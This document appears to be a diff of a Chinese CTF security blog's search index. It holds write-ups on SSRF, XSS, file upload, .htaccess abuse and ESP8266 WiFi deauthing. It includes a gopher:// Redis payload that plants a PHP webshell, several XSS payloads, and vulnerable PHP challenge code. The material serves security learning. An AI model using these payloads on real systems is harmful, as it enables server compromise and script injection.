-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">gopher://<span class="number">173.17</span><span class="number">.51</span><span class="number">.11</span>:<span class="number">6379</span>/_%<span class="number">2</span>A1%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">248</span>%<span class="number">0</span>D%<span class="number">0</span>Aflushall%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">2</span>A3%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">243</span>%<span class="number">0</span>D%<span class="number">0</span>Aset%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">241</span>%<span class="number">0</span>D%<span class="number">0</span>A1%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">2432</span>%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">0</span>A%<span class="number">0</span>A%<span class="number">3</span>C%<span class="number">3</span>Fphp%<span class="number">20</span>system%<span class="number">28</span>%<span class="number">22</span>cat%<span class="number">20</span>/flag%<span class="number">22</span>%<span class="number">29</span>%<span class="number">3</span>B%<span class="number">3</span>F%<span class="number">3</span>E%<span class="number">0</span>A%<span class="number">0</span>A%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">2</span>A4%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">246</span>%<span class="number">0</span>D%<span class="number">0</span>Aconfig%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">243</span>%<span class="number">0</span>D%<span class="number">0</span>Aset%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">243</span>%<span class="number">0</span>D%<span class="number">0</span>Adir%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">2413</span>%<span class="number">0</span>D%<span class="number">0</span>A/var/www/html%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">2</span>A4%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">246</span>%<span class="number">0</span>D%<span class="number">0</span>Aconfig%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">243</span>%<span class="number">0</span>D%<span class="number">0</span>Aset%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">2410</span>%<span class="number">0</span>D%<span class="number">0</span>Adbfilename%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">249</span>%<span class="number">0</span>D%<span class="number">0</span>Ashell.php%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">2</span>A1%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">244</span>%<span class="number">0</span>D%<span class="number">0</span>Asave%<span class="number">0</span>D%<span class="number">0</span>A</span><br></pre></td></tr></table></figure>
-
-<p>在输入框直接打进去。会在根目录下生成个文件shell.php，然后访问173.17.51.11/shell.php即可得到flag。</p>
-]]></content>
-      <categories>
-        <category>web安全</category>
-      </categories>
-  </entry>
-  <entry>
     <title>WMCTF 2020</title>
     <url>/2020/08/06/WMCTF2020/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h1><p>不会做，好多知识盲点🙃<a id="more"></a></p>
+    <content><![CDATA[<p>不会做，好多知识盲点🙃<a id="more"></a></p>
 <h1 id="web"><a href="#web" class="headerlink" title="web"></a><strong>web</strong></h1><h2 id="web-checkin"><a href="#web-checkin" class="headerlink" title="web_checkin"></a><strong>web_checkin</strong></h2><p>源码为</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//PHP 7.0.33 Apache/2.4.25</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$sandbox = <span class="string">&#x27;/var/www/html/&#x27;</span> . md5($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">@mkdir($sandbox);</span><br><span class="line">@chdir($sandbox);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;content&#x27;</span>])) &#123;</span><br><span class="line">    $content = $_GET[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/iconv|UCS|UTF|rot|quoted|base64/i&#x27;</span>,$content))</span><br><span class="line">         <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(file_exists($content))</span><br><span class="line">        <span class="keyword">require_once</span>($content);</span><br><span class="line">    file_put_contents($content,<span class="string">&#x27;&lt;?php exit();&#x27;</span>.$content);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
@@ -1395,7 +1248,7 @@
   <entry>
     <title>ciscn初赛 2020</title>
     <url>/2020/08/22/ciscn%E5%88%9D%E8%B5%9B/</url>
-    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h2><p>一次躺赢的比赛<a id="more"></a></p>
+    <content><![CDATA[<p>一次躺赢的比赛<a id="more"></a></p>
 <p>一队wp:<a style="text-decoration:none;" class="foo" href="https://www.redmango.top/article/44" target="_blank">传送门</a></p>
 <p>y1ng师傅wp:<a style="text-decoration:none;" class="foo" href="https://www.gem-love.com/ctf/2569.html" target="_blank">传送门</a></p>
 <h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a><strong>easyphp</strong></h2><p>源码为</p>
@@ -1468,7 +1321,7 @@
   <entry>
     <title>esp8266制作wifi杀手及wifi钓鱼</title>
     <url>/2020/03/04/esp8266%E5%88%B6%E4%BD%9Cwifi%E6%9D%80%E6%89%8B%E5%8F%8Awifi%E9%92%93%E9%B1%BC/</url>
-    <content><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h4><p>esp8266是一块带自带wifi模块的Arduino，上传代码可以使用烧录工具，同时他还支持Arduino 开发环境编程。这里用esp8266做别人已经写好的wifi杀手和wifi钓鱼。还有千万要注意不要乱攻击别人的wifi，自己测试玩玩就好。<a id="more"></a></p>
+    <content><![CDATA[<p>esp8266是一块带自带wifi模块的Arduino，上传代码可以使用烧录工具，同时他还支持Arduino 开发环境编程。这里用esp8266做别人已经写好的wifi杀手和wifi钓鱼。还有千万要注意不要乱攻击别人的wifi，自己测试玩玩就好。<a id="more"></a></p>
 <h4 id="wifi杀手"><a href="#wifi杀手" class="headerlink" title="wifi杀手"></a><strong>wifi杀手</strong></h4><p>所需材料：</p>
 <ul>
 <li>esp8266一块</li>
@@ -1516,7 +1369,7 @@
   <entry>
     <title>esp8266连接显示器</title>
     <url>/2020/03/21/esp8266%E8%BF%9E%E6%8E%A5%E6%98%BE%E7%A4%BA%E5%99%A8/</url>
-    <content><![CDATA[<h5 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h5><p>简介:本篇文章展示用OLED显示屏与ESP8266连接。OLED淘宝上一般有两种，4引脚(IIC)和7引脚(SPI)，7引脚的屏幕就稍微大点。这里我用的是4引脚。接线如下所示。基本就3.3接vcc，gnd地线接地线没有问题，引用角D1(GPIO5)，D2(GPIO4)接SLC和SDA。<a id="more"></a></p>
+    <content><![CDATA[<p>简介:本篇文章展示用OLED显示屏与ESP8266连接。OLED淘宝上一般有两种，4引脚(IIC)和7引脚(SPI)，7引脚的屏幕就稍微大点。这里我用的是4引脚。接线如下所示。基本就3.3接vcc，gnd地线接地线没有问题，引用角D1(GPIO5)，D2(GPIO4)接SLC和SDA。<a id="more"></a></p>
 <p><strong>价格：</strong>一个esp8266和oled显示器加起来也就20块左右。</p>
 <img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200321115923891.png" alt="image-20200321115923891" style="high:40%;width:40%;" />
 
@@ -1559,7 +1412,7 @@
   <entry>
     <title>XSS闯关小游戏</title>
     <url>/2020/04/29/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/</url>
-    <content><![CDATA[<h5 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h5><p>练习一下xss。平台地址为：<a style="text-decoration:none;" class="foo" href="http://test.ctf8.com/" target="_blank">传送门</a><a id="more"></a></p>
+    <content><![CDATA[<p>练习一下xss。平台地址为：<a style="text-decoration:none;" class="foo" href="http://test.ctf8.com/" target="_blank">传送门</a><a id="more"></a></p>
 <h5 id="level1"><a href="#level1" class="headerlink" title="level1"></a><strong>level1</strong></h5><p>没有任何过滤，直接给name传值，<strong>payload：</strong></p>
 <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
@@ -1687,7 +1540,7 @@
   <entry>
     <title>如何用PIL库处理图片</title>
     <url>/2020/04/19/%E5%A6%82%E4%BD%95%E7%94%A8PIL%E5%BA%93%E5%A4%84%E7%90%86%E5%9B%BE%E7%89%87/</url>
-    <content><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h4><p>最近有几场CTF比赛，里面的题都不会做，没有思路，感觉自己现在的状态就是思而不学则殆，于是乎就在bugku里面刷杂项题。遇到一些图片的题目，除了使用kail的binwalk,foremost隐写图片和改高度宽度以及使用一些工具之外，还发现有好几题都要用到PIL库这个东西，就记录一下怎么用。<a id="more"></a></p>
+    <content><![CDATA[<p>最近有几场CTF比赛，里面的题都不会做，没有思路，感觉自己现在的状态就是思而不学则殆，于是乎就在bugku里面刷杂项题。遇到一些图片的题目，除了使用kail的binwalk，foremost隐写图片和改高度宽度以及使用一些工具之外，还发现有好几题都要用到PIL库这个东西，就记录一下怎么用<a id="more"></a></p>
 <p>关于PIL库的更多用法可以参考：<a style="text-decoration:none;" class="foo" href="https://www.liaoxuefeng.com/wiki/897692888725344/966759628285152" target="_blank">传送门</a></p>
 <h4 id="使用PIL库"><a href="#使用PIL库" class="headerlink" title="使用PIL库"></a><strong>使用PIL库</strong></h4><p><strong>安装库</strong></p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br></pre></td></tr></table></figure>
@@ -1782,7 +1635,7 @@
   <entry>
     <title>安恒七月赛 2020</title>
     <url>/2020/07/26/%E5%AE%89%E6%81%92%E4%B8%83%E6%9C%88%E8%B5%9B/</url>
-    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h3><p>就几道题，水一下<a id="more"></a></p>
+    <content><![CDATA[<p>就几道题，水一下<a id="more"></a></p>
 <h3 id="ezfileinclude"><a href="#ezfileinclude" class="headerlink" title="ezfileinclude"></a><strong>ezfileinclude</strong></h3><p>打开题目链接后显示出来的是一张图片，查看网页源代码会在img标签种发现一个/image.php?t=xxxxx&amp;f=base64(xxxx)</p>
 <p>这道题目考点也是文件读取，所以利用点肯定在f这个参数了，但只是过滤了开头的<code>../</code></p>
 <p>这里用一下Hhhm师傅的脚本</p>
@@ -1828,9 +1681,7 @@
   <entry>
     <title>搭建动态CTFd</title>
     <url>/2020/07/27/%E6%90%AD%E5%BB%BA%E5%8A%A8%E6%80%81CTFd/</url>
-    <content><![CDATA[<a id="more"></a>
-
-<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h3><p>网上的搭建教程有很多了，但是有几个比较坑的地方的资料比较零散，这里记录一下从零开始搭建的过程，虽然因为各种原因最后还是学贤大佬帮我搭好了🙃，这个动态靶机是真的方便。</p>
+    <content><![CDATA[<p>记录一次从零开始搭建CTF动态靶场的过程<a id="more"></a></p>
 <h3 id="前置工作"><a href="#前置工作" class="headerlink" title="前置工作"></a><strong>前置工作</strong></h3><p>本篇搭建环境为centos7.6</p>
 <p>学贤大佬用的是ubuntu18也搭成功了，但是相对来说还是centos比较方便。</p>
 <h4 id="更新yum源"><a href="#更新yum源" class="headerlink" title="更新yum源"></a><strong>更新yum源</strong></h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">yum update</span><br></pre></td></tr></table></figure>
@@ -1909,8 +1760,8 @@
   <entry>
     <title>无参数RCE</title>
     <url>/2020/07/18/%E6%97%A0%E5%8F%82%E6%95%B0RCE/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h1><p>无参数RCE方法小总结，可以参考</p>
-<p><a class="foo" href="https://xz.aliyun.com/t/6737" target="_blank">从一道CTF题学习Fuzz思想</a><a id="more"></a></p>
+    <content><![CDATA[<p>无参数RCE方法小总结<a id="more"></a></p>
+<p>可以参考：<a class="foo" href="https://xz.aliyun.com/t/6737" target="_blank">从一道CTF题学习Fuzz思想</a></p>
 <h1 id="无参数RCE题目"><a href="#无参数RCE题目" class="headerlink" title="无参数RCE题目"></a><strong>无参数RCE题目</strong></h1><h1 id="例题一"><a href="#例题一" class="headerlink" title="例题一"></a><strong>例题一</strong></h1><p>题目源码如下</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $_GET[<span class="string">&#x27;code&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">eval</span>($_GET[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
@@ -2025,9 +1876,9 @@
   <entry>
     <title>无字符构造webshell</title>
     <url>/2020/07/18/%E6%97%A0%E5%AD%97%E7%AC%A6%E6%9E%84%E9%80%A0webshell/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h1><p>学习一波奇淫巧计，本篇大量参考了P神离别歌的文章：</p>
+    <content><![CDATA[<p>学习一波奇淫巧计<a id="more"></a></p>
 <p><a class="foo" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank">一些不包含数字和字母的webshell</a></p>
-<p><a class="foo" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html" target="_blank">无字母数字webshell之提高篇</a><a id="more"></a></p>
+<p><a class="foo" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html" target="_blank">无字母数字webshell之提高篇</a></p>
 <h1 id="无字符绕过"><a href="#无字符绕过" class="headerlink" title="无字符绕过"></a><strong>无字符绕过</strong></h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/[a-z0-9]/is&#x27;</span>,$_GET[<span class="string">&#x27;shell&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">eval</span>($_GET[<span class="string">&#x27;shell&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <ul>
@@ -2189,10 +2040,9 @@
       </categories>
   </entry>
   <entry>
-    <title>【转载】CTF中.htaccess文件的利用</title>
+    <title>CTF中.htaccess文件的利用</title>
     <url>/2020/10/10/CTF%E4%B8%AD.htaccess%E6%96%87%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8/</url>
-    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>文章首发i春秋：<a href="https://bbs.ichunqiu.com/thread-58841-1-1.html">传送门</a><a id="more"></a></p>
-<p>.htaccess文件是<a href="https://baike.baidu.com/item/Apache">Apache</a>服务器中的一个配置文件，它负责相关目录下的网页配置。通过.htaccess文件，可以在所在文件夹和子文件下改变php.ini的配置。</p>
+    <content><![CDATA[<p>.htaccess文件是<a href="https://baike.baidu.com/item/Apache">Apache</a>服务器中的一个配置文件，它负责相关目录下的网页配置。通过.htaccess文件，可以在所在文件夹和子文件下改变php.ini的配置。<a id="more"></a></p>
 <p>在CTF的题目中，如果能够上传或者写入一个.htaccess，我们就可以做到比如说绕过WAF，以及文件包含等操作，因为之前打羊城杯看到.htaccess的文件的利用，就想把我自己之前遇到过的各种用法总结一下。</p>
 <p>.htaccess文件是默认开启的，如果没有启动.htaccess文件的话，需要修改配置文件httpd.conf中的以下两点：</p>
 <ul>
@@ -2440,6 +2290,7 @@
 
 <p><img src="http://yuhaojiang.gitee.io/picture/CTF%E4%B8%AD.htaccess%E6%96%87%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8/image-20200912223549012.png"></p>
 <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>总的来说，在CTF题目中如果.htaccess是可控的，那么我们就可以想到利用他来做一点什么，用法也灵活多变，具体看题目，而这同时也侧面说明了我们在现实开发环境中，.htaccess是非常危险的，应该尽量避免使用.htaccess文件，例如禁止上传.htaccess，或者直接把AllowOverride这一选项修改为AllowOverride None。</p>
+<p>文章首发i春秋：<a href="https://bbs.ichunqiu.com/thread-58841-1-1.html">传送门</a></p>
 <h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.freebuf.com/articles/network/240521.html">深究用户利用.htaccess的原理篡改配置导致的安全问题</a></p>
 <p><a href="https://www.freebuf.com/vuls/218495.html">Apache中.htaccess文件利用的总结与新思路拓展</a></p>
 <p><a href="https://www.anquanke.com/post/id/205098">.htaccess利用与Bypass方式总结</a>                    </p>
@@ -2452,9 +2303,7 @@
   <entry>
     <title>反序列化漏洞总结</title>
     <url>/2020/05/12/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</url>
-    <content><![CDATA[<a id="more"></a>
-
-<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h1><p>最近在buu刷题，遇到到了一些关于反序列化的题目，这里做一个总结。</p>
+    <content><![CDATA[<p>最近在buu刷题，遇到到了一些关于反序列化的题目，这里做一个总结<a id="more"></a></p>
 <h1 id="PHP反序列化漏洞"><a href="#PHP反序列化漏洞" class="headerlink" title="PHP反序列化漏洞"></a><strong>PHP反序列化漏洞</strong></h1><h2 id="序列化和反序列化是什么？"><a href="#序列化和反序列化是什么？" class="headerlink" title="序列化和反序列化是什么？"></a><strong>序列化和反序列化是什么？</strong></h2><blockquote>
 <p>所有php里面的值都可以使用函数serialize()来返回一个包含字节流的字符串来表示。unserialize()函数能够重新把字符串变回php原来的值。 序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。 ——php官方文档</p>
 </blockquote>
@@ -2806,10 +2655,9 @@
       </categories>
   </entry>
   <entry>
-    <title>【转载】浅谈ssrf与ctf那些事</title>
+    <title>浅谈ssrf与ctf那些事</title>
     <url>/2020/10/22/%E6%B5%85%E8%B0%88ssrf%E4%B8%8Ectf%E9%82%A3%E4%BA%9B%E4%BA%8B/</url>
-    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>文章首发合天：<a href="https://mp.weixin.qq.com/s/qfYqkBH11YZxiCJXYIwd7Q">传送门</a><a id="more"></a></p>
-<p>有关SSRF(Server-Side Request Forgery:服务器端请求伪造)介绍的文章很多了，这里主要是把自己学习和打ctf中遇到的一些trick和用法整理和记录一下。</p>
+    <content><![CDATA[<p>有关SSRF(Server-Side Request Forgery:服务器端请求伪造)介绍的文章很多了，这里主要是把自己学习和打ctf中遇到的一些trick和用法整理和记录一下。<a id="more"></a></p>
 <p>有个最基本的问题就是，如何判断ctf题目是考察SSRF或者说存在SSRF的点呢，首先要知道出现ssrf的函数基本就这几个<code>file_get_contents()</code>、<code>curl()</code>、<code>fsocksopen()</code>、<code>fopen()</code>，如果获取到题目源码了，源码中存在这些个函数就大致可以判断是否有ssrf，如果没有题目的源码，ssrf的入口一般是出现在调用外部资源的地方，比如url有个参数让你传或者是在html中的输入框，然后就用<code>http://</code>，<code>file://</code>，<code>dict://</code>协议读取一下。</p>
 <p>举个例子，近日打的西湖论剑有一道题为flagshop中用ssrf读文件</p>
 <p><img src="http://yuhaojiang.gitee.io/picture/%E6%B5%85%E8%B0%88ssrf%E4%B8%8Ectf%E9%82%A3%E4%BA%9B%E4%BA%8B/image-20201015092531597.png" alt="image-20201015092531597"></p>
@@ -3038,6 +2886,7 @@
 <p><img src="http://yuhaojiang.gitee.io/picture/%E6%B5%85%E8%B0%88ssrf%E4%B8%8Ectf%E9%82%A3%E4%BA%9B%E4%BA%8B/image-20201018220722711.png" alt="image-20201018220722711"></p>
 <p>关于更多的DNS-rebinding攻击利用方法见参考链接</p>
 <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>在ctf中ssrf一般不会单独出题，大多数情况下是作为其中一个利用点，知识点看起来就那几个，总结起来还挺多的，由于水平有限，本篇可能还有一些点没有提到，比如赵总最近写了一个ssrf新的利用方法：<a href="https://www.zhaoj.in/read-6681.html%EF%BC%8C%E6%9C%89%E5%85%B4%E8%B6%A3%E5%8F%AF%E4%BB%A5%E7%9C%8B%E7%9C%8B%E3%80%82">https://www.zhaoj.in/read-6681.html，有兴趣可以看看。</a></p>
+<p>文章首发合天：<a href="https://mp.weixin.qq.com/s/qfYqkBH11YZxiCJXYIwd7Q">传送门</a></p>
 <h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf">https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf</a></p>
 <p><a href="http://www.bendawang.site/2017/05/31/%E5%85%B3%E4%BA%8EDNS-rebinding%E7%9A%84%E6%80%BB%E7%BB%93/">http://www.bendawang.site/2017/05/31/%E5%85%B3%E4%BA%8EDNS-rebinding%E7%9A%84%E6%80%BB%E7%BB%93/</a></p>
 ]]></content>
@@ -3048,7 +2897,7 @@
   <entry>
     <title>虎符&amp;MRCTF 2020</title>
     <url>/2020/04/24/%E8%99%8E%E7%AC%A6%E5%92%8CMRCTF/</url>
-    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h2><p>这次复现的题目是师兄本周开会讲的题目，我都复现了一下，又学到了新的东西。题目具体详情可以参考师兄的文章：<a class="foo" target="_blank" href="https://www.plasf.cn/2020/04/20/HFCTF_WP/">传送门</a><a id="more"></a></p>
+    <content><![CDATA[<p>这次复现的题目是师兄本周开会讲的题目，我都复现了一下，又学到了新的东西。题目具体详情可以参考师兄的文章：<a class="foo" target="_blank" href="https://www.plasf.cn/2020/04/20/HFCTF_WP/">传送门</a><a id="more"></a></p>
 <h2 id="虎符"><a href="#虎符" class="headerlink" title="虎符"></a><strong>虎符</strong></h2><h3 id="easy-login"><a href="#easy-login" class="headerlink" title="easy_login"></a><strong>easy_login</strong></h3><p>首先打开题目源码发现static/js/app.js，进去后发现koa</p>
 <p>利用 koa-static 错误配置的源码泄露获得源码，进行审计。直接读取app.js</p>
 <p>koa是基于Node.js的web框架。然后再进去controller.js</p>
@@ -3297,7 +3146,7 @@
   <entry>
     <title>upload-labs</title>
     <url>/2020/05/04/upload-labs/</url>
-    <content><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h4><p>练习一下文件上传漏洞，项目地址：<a class="foo" href="https://github.com/c0ny1/upload-labs" target="_blank">传送门</a><a id="more"></a></p>
+    <content><![CDATA[<p>练习一下文件上传漏洞，项目地址：<a class="foo" href="https://github.com/c0ny1/upload-labs" target="_blank">传送门</a><a id="more"></a></p>
 <h4 id="Pass-01-js检查"><a href="#Pass-01-js检查" class="headerlink" title="Pass-01(js检查)"></a><strong>Pass-01(js检查)</strong></h4><p>前端js检查：</p>
 <p>1.首先打开burp和浏览器</p>
 <p>2.上传1.php文件进行观察</p>
@@ -3552,10 +3401,9 @@
       </categories>
   </entry>
   <entry>
-    <title>【转载】浅谈ctf中无回显</title>
+    <title>浅谈ctf中无回显</title>
     <url>/2020/11/10/%E6%B5%85%E8%B0%88ctf%E4%B8%AD%E6%97%A0%E5%9B%9E%E6%98%BE/</url>
-    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>文章首发i春秋：<a href="https://bbs.ichunqiu.com/thread-59175-1-1.html">传送门</a><a id="more"></a></p>
-<p>在打ctf中会经常遇到没有回显的情况，比如说命令可执行没有回显，XXE无回显，sql盲注等等，这方面的知识对我来说算是比较零散，没有系统的总结过，在比赛中遇到这种情况总是显得捉襟见肘，于是便决定通过写一篇文章来总结一下这方面的知识。</p>
+    <content><![CDATA[<p>在打ctf中会经常遇到没有回显的情况，比如说命令可执行没有回显，XXE无回显，sql盲注等等，这方面的知识对我来说算是比较零散，没有系统的总结过，在比赛中遇到这种情况总是显得捉襟见肘，于是便决定通过写一篇文章来总结一下这方面的知识。<a id="more"></a></p>
 <h2 id="常用工具"><a href="#常用工具" class="headerlink" title="常用工具"></a>常用工具</h2><p>工欲善其事必先利其器，在正文之前，先把几种可以在无回显中外带数据的工具介绍一下</p>
 <ul>
 <li>DNSLog Platform</li>
@@ -3836,6 +3684,7 @@
 
 <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>由于篇幅和水平有限，这里只介绍了sql盲注，XXE无回显，命令执行无回显三种CTF常用到的一些操作，如果有不足之处请大家指出，轻点喷。</p>
 <p>然后命令执行无回显在CTF中由于环境有些命令不可用或者说存在过滤等等，有些方法不一定可行，所以可以各种方法结合绕过试一下。</p>
+<p>文章首发i春秋：<a href="https://bbs.ichunqiu.com/thread-59175-1-1.html">传送门</a></p>
 <h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.cnblogs.com/sstfy/p/10351807.html">https://www.cnblogs.com/sstfy/p/10351807.html</a></p>
 <p><a href="https://xz.aliyun.com/t/8125">https://xz.aliyun.com/t/8125</a></p>
 ]]></content>
@@ -3846,7 +3695,7 @@
   <entry>
     <title>太湖杯 2020</title>
     <url>/2020/11/14/%E5%A4%AA%E6%B9%96%E6%9D%AF/</url>
-    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>复盘一下不久前的太湖杯的web&amp;misc<a id="more"></a></p>
+    <content><![CDATA[<p>复盘一下不久前的太湖杯的web&amp;misc<a id="more"></a></p>
 <h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="checkInGame"><a href="#checkInGame" class="headerlink" title="checkInGame"></a>checkInGame</h3><p>进去之后是一个连连看的画面，倒计时40秒完成即可获得flag</p>
 <p><img src="http://yuhaojiang.gitee.io/picture/%E5%A4%AA%E6%B9%96%E6%9D%AF/image-20201108092621281.png" alt="image-20201108092621281"></p>
 <p>试了几次发现时间完全不够，当然连连看高手除外，正确做法是：</p>
@@ -3971,10 +3820,9 @@
       </categories>
   </entry>
   <entry>
-    <title>【转载】浅谈SVG的两个黑魔法</title>
+    <title>浅谈SVG的两个黑魔法</title>
     <url>/2020/11/06/%E6%B5%85%E8%B0%88SVG%E7%9A%84%E4%B8%A4%E4%B8%AA%E9%BB%91%E9%AD%94%E6%B3%95/</url>
-    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>文章首发合天：<a href="https://mp.weixin.qq.com/s/aVLU4Q7VzmrmrjAYRguLHw">传送门</a><a id="more"></a></p>
-<p>之前在CTF比赛中遇到了一些关于SVG造成的安全问题，多亏诸多师傅的题目给我的一顿痛打让我又了解了不少新的知识和SVG在WEB安全中的应用，拓展了我的攻击面。</p>
+    <content><![CDATA[<p>之前在CTF比赛中遇到了一些关于SVG造成的安全问题，多亏诸多师傅的题目给我的一顿痛打让我又了解了不少新的知识和SVG在WEB安全中的应用，拓展了我的攻击面。<a id="more"></a></p>
 <h2 id="SVG简介"><a href="#SVG简介" class="headerlink" title="SVG简介"></a>SVG简介</h2><p>SVG(Scalable Vector Graphics)是一种基于XML的二维矢量图格式，和我们平常用的jpg/png等图片格式所不同的是SVG图像在放大或改变尺寸的情况下其图形质量不会有所损失，并且我们可以使用任何的文本编辑器打开SVG图片并且编辑它，目前主流的浏览器都已经支持SVG图片的渲染。</p>
 <h2 id="SVG造成XSS"><a href="#SVG造成XSS" class="headerlink" title="SVG造成XSS"></a>SVG造成XSS</h2><h3 id="直奔主题"><a href="#直奔主题" class="headerlink" title="直奔主题"></a>直奔主题</h3><p>我们在一张SVG图片里面插入一个JavaScript代码。</p>
 <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.1&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">circle</span> <span class="attr">cx</span>=<span class="string">&quot;100&quot;</span> <span class="attr">cy</span>=<span class="string">&quot;50&quot;</span> <span class="attr">r</span>=<span class="string">&quot;40&quot;</span> <span class="attr">stroke</span>=<span class="string">&quot;black&quot;</span> <span class="attr">stroke-width</span>=<span class="string">&quot;2&quot;</span> <span class="attr">fill</span>=<span class="string">&quot;red&quot;</span> /&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span 